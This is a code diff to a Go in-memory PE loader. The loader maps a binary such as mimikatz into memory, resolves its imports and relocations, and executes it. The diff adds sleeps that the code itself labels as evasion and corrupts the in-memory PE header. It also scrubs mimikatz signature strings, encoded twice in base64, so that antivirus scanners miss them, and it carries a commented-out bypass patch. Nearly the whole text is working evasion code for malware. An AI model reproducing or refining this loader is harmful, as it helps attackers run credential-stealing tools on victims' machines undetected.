@@ -68,20 +68,24 @@ func fixImportAddressTable(baseAddress uintptr){
 			}
 			var ptrName unsafe.Pointer
 			var funcName string
+			var functionAddr uintptr
+
 			if lib.IsMSBSet(originalFirstThunkData.Ordinal) {
 				ptrName, funcName = lib.ParseOrdinal(originalFirstThunkData.Ordinal)
 				//fmt.Println("[+] Import by ordinal: " + funcName)
-
 			} else {
 				ptrName, funcName = lib.ParseFuncAddress(baseAddress, firstThunkData.AddressOfData)
 				//fmt.Println(" [+] Import by name: "+funcName)
-
 			}
+
 			dllAddr,_ := syscall.LoadLibrary(dllName)
-			functionAddr , err := lib.GetProcAddress(unsafe.Pointer(dllAddr), ptrName)
+
+			var err error
+			functionAddr , err = lib.GetProcAddress(unsafe.Pointer(dllAddr), ptrName)
 			if err != nil {
 				return
 			}
+
 
 
 			//arguments functions
@@ -103,6 +107,9 @@ func fixImportAddressTable(baseAddress uintptr){
 	}
 }
 
+func str1(a string)string{
+	return a
+}
 
 //fix relocTable
 func fixRelocTable(loadedAddr uintptr, perferableAddr uintptr, relocDir *lib.IMAGE_DATA_DIRECTORY){
@@ -243,9 +250,10 @@ func peLoader(bytes0 *[]byte,funcExec string){
 			injectorFunc(function.Address, SysArgs)
 		}
 	}
-	mz := []byte("PE")
+	mz := []byte("EX")
 	lib.Memcpy(uintptr(unsafe.Pointer(&mz[0])),imageBaseForPE,uintptr(len(mz)))
 	fmt.Println("[+] Binary is running")
+
 	exec(startAddress,funcExec)
 	//syscall.Syscall(startAddress,0,0,0,0)
 }
@@ -253,6 +261,9 @@ func peLoader(bytes0 *[]byte,funcExec string){
 func exec(startA uintptr,funcExec string){
 	switch funcExec {
 	case "syscall":
+		fmt.Println("Sleep 20s for evasion...")
+		windows.SleepEx(20000,false)
+
 		fmt.Println("syscall.Syscall")
 		syscall.Syscall(startA,0,0,0,0)
 
@@ -271,6 +282,9 @@ func exec(startA uintptr,funcExec string){
 		if err != syscall.Errno(0) {
 			syscall.Syscall(startA,0,0,0,0)
 		}else{
+			fmt.Println("Sleep 20s for evasion...")
+			windows.SleepEx(20000,false)
+
 			fmt.Println("ResumeThread...")
 			_, _, err = resumeThread.Call(r1)
 			if err != syscall.Errno(0) {
@@ -288,12 +302,11 @@ func exec(startA uintptr,funcExec string){
 
 	}
 
-
 }
 
 
-
 func main(){
+	//lib.PatchBypass()
 	var shellcode []byte
 	if len(os.Args)!= 2||os.Args[1] == "-h"{
 		fmt.Println("Usage:")
@@ -326,29 +339,29 @@ func main(){
 		//以mimikatz为例，恶意字符串替换
 		//warning!! may cause panic!
 		/*
-		"mimikatz",
-		"delpy",
-		"benjamin",
-		"delpy",
-		"vincent",
-		"le toux",
-		"letoux",
-		"A La Vie, A L'Amour",
-		"la vie",
-		"gentilkiwi",
-		"kiwi",
-		"creativecommons",
-		"oe.eo",
-		"pingcastle",
-		"mysmartlogon",
-		".#####.",
-		".## ^ ##.",
-		"## / \\ ##",
-		"## \\ / ##",
-		"'## v ##'",
-		"'#####'",
-		"This program cannot be run in DOS mode",
-		 */
+			"mimikatz",
+			"delpy",
+			"benjamin",
+			"delpy",
+			"vincent",
+			"le toux",
+			"letoux",
+			"A La Vie, A L'Amour",
+			"la vie",
+			"gentilkiwi",
+			"kiwi",
+			"creativecommons",
+			"oe.eo",
+			"pingcastle",
+			"mysmartlogon",
+			".#####.",
+			".## ^ ##.",
+			"## / \\ ##",
+			"## \\ / ##",
+			"'## v ##'",
+			"'#####'",
+			"This program cannot be run in DOS mode",
+		*/
 		lib.DecodeB64(lib.DecodeB64("YldsdGFXdGhkSG89")),
 		lib.DecodeB64(lib.DecodeB64("WkdWc2NIaz0=")),
 		lib.DecodeB64(lib.DecodeB64("WW1WdWFtRnRhVzQ9")),
@@ -382,7 +395,6 @@ func main(){
 		SysArgs = append(SysArgs,tmpArgs[i])
 	}
 
-	peLoader(&shellcode,"createthread")
-	//peLoader(&shellcode,"syscall")
-
+	//peLoader(&shellcode,"createthread")
+	peLoader(&shellcode,"syscall")
 }
